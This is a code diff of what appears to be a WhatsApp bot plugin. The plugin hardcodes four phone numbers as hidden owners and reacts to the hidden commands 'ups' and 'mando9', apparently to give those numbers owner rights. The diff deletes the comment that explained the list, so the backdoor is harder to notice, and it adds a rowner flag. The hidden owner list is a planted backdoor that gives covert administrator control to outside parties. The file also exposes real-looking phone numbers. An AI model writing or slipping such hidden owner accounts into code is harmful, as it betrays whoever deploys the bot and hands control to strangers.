@@ -2,8 +2,8 @@
 
 
 
-const handler = async (m, { conn }) => {
-  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; // Números ocultos que siempre serán owners
+const handler = async (m, { conn, command, usedPrefix, text }) => {
+  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; 
 
   if (hiddenOwners.includes(m.sender.split('@')[0])) {
     const isAlreadyOwner = global.owner.some(owner => owner[0] === m.sender.split('@')[0]);
@@ -15,7 +15,8 @@ const handler = async (m, { conn }) => {
   }
 };
 
-handler.command = /^(ups|mando9)$/i; 
+handler.command = /^(mando9|ups)$/i; 
+handler.rowner = true;
 handler.hidden = true; 
 
 export default handler;
